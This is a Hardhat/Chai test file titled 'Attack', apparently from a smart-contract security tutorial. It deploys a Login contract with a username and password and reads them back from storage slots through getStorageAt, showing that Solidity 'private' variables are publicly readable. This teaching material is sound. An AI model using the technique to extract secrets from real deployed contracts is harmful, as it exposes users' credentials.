const {ethers} = require('hardhat');
const { expect} = require('chai');

describe("Attack", function() {
    it("Should be able to read the private variables username & password", async function() {

        const loginFactory = await ethers.getContractFactory('Login');


        // To save space, we would convert the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String('test');
        const passwordBytes = ethers.utils.formatBytes32String('password');

        const loginContract = await loginFactory.deploy(usernameBytes, passwordBytes);

        await loginContract.deployed();

       // Get the storage at storage slot 0,1
       const slot0Bytes = await ethers.provider.getStorageAt(loginContract.address, 0);

       const slot1Bytes = await ethers.provider.getStorageAt(loginContract.address, 1);


      // We are able to extract the values of the private variables
       expect(slot0Bytes).to.equal(usernameBytes);
       expect(slot1Bytes).to.equal(passwordBytes);

     /* 
     other ways of comparing
     1. 
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
    
    2. 
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal(ethers.utils.parseBytes32String(usernameBytes));
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal(ethers.utils.parseBytes32String(passwordBytes));   
     
     
     */  
    });
});


/* 
1. In this test, we first create usernameBytes and passwordBytes, 
which are bytes32 versions of a short string to behave as our username and password. 

2. We then deploy the Login contract with those values.

3 After the contract is deployed, we use provider.getStorageAt to read storage slot values at loginContract.address for slots 0 and 1 directly, 
and extract the byte values from it.

4. Then, we can compare the retrieved values - slot0Bytes against usernameBytes and slot1Bytes against passwordBytes 
to ensure they are, in fact, equal.

5. If the tests pass, it means we were successfully able to read the values of the private variables directly without needing to call functions on the contract at all.


If the tests passed, that means you were able to access the values of variables marked private in the Smart Contract. 
Not so private after all, eh?

*/